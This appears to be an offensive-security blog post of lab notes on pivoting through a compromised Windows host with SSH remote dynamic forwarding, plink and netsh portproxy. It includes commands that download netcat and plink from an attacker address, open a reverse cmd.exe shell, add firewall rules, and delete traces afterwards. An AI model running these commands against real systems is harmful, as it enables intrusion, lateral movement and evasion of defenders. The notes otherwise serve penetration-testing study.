---
layout: post
title: Windows Port Forwarding
titledate: 09/24/23
tags: ["infosec", "info_gathering", "offsec", "tunnel", "plink", "netsh", "ssh"]
---

#### Windows SSH tools

windows has ssh and several other bundled tools available by default since win 1803 and an option since 1709 

by default ssh is located in %systemdrive%\Windows\System32\OpenSSH

if our DMZ target1 has ssh installed we can use that to setup a remote dynamic port forward

on our attacking machine

    $ sudo systemctl start ssh

then on our attacking machine we connect via rdp to the connection that has ssh installed via rdp

    $ xfreerdp /u:rdp_user /p:password /v:192.168.1.1

to check for ssh in windows

    $ where ssh

    $ ssh.exe -V

if the versin of ssh is higher than 7.6 then we can use remote dynamic port forwarding

now we open up the remote dynamic listening session on our kali machine

    target1: ssh -N -R 9998 attacker@192.168.1.1

to check the port is listening on our kali machine

    $ ss -ntplu

update /etc/proxychains4.conf

    socks5 127.0.0.1 9998

in this example the postgres db is on an internal network we cannot reach but our ssh windows machine can , now that we have remote dynamic port forwarding setup, we can use proxychains with psql to connect to this internal db

    $ proxychains psql -h 10.4.50.1 -U postgres

#### plink

what if ssh has been removed

one of the advantages of plink is it is not as readily flagged as an unwanted communication tool compared to some other more well known tools

to run plink we first need to copy over netcat to our windows machine

i do this with a python server

    $ cp /usr/share/windows-resources/binaries/nc.exe .

    $ python3 -m uploadserver

or if we have a shell only

    target1:> powershell wget -Uri http://192.168.10.10/nc.exe -OutFile C:\Windows\Temp\nc.exe

then on windows i can download the the executable

setup a netcat listener on our attacker

    $ nc -nvlp 4446

on the windows taget connect to the nc listener

    $ C:\Windows\Temp\nc.exe -e cmd.exe 192.168.1.1 4446

then we copy plink over to windows

    $ cp /usr/share/windows-resources/binaries/plink.exe .

if no gui an shell only

    C:> powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe

once plink is copied over

    $ C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.1.1

then on our kali host we can check that 9833 is listening

    $ ss -ntplu

now we can conect to the attacking machine loopback interface through port 9983 via rdp through the plink remote port forward

    $ xfreerdp /u:rdp /p:password /v:127.0.0.1:9833

#### netsh

netsh does require admin privs to setup port forwarding but it is a native windows tool

in this example we want to connect to an internal pg db via an ssh port forward and have admin rdp access to a target windows machine

we rdp to the machine

    $ xfreerdp /u:rdp /p:password /v:192.168.1.1

because we can run cmd as admin we do so

    C:> netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.1.1 connectport=22 connectaddress=10.4.1.1

here we use netsh to create a listening external interface 2222  forward traffic to the pg db port 22 

we can use netstat to see our listening ports

    C:> netstat -anp TCP | find "2222"

and check our port forward setup

    C:> netsh interface portproxy show all

now we can check the port from our attacking machine

    $ sudo nmap -sS 192.168.1.1 -Pn -n -p2222

it is possible that a firewall is blocking 2222 if it reports filtered

if this is the case we can use netsh again to create a firewall rule to allow connections on this port

    C:> netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.1.1 localport=2222 action=allow

now if the port is open we can connect from our attacking kali machine to port 2222 on our listening target1 windows machine and directly reach port 22 on the internal pg db machine

    $ ssh database_admin@192.168.1.1 -p2222

after our attack is complete we can delete both the firewall rule and port forward to erase our steps

    C:> netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
    C:> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.1.1


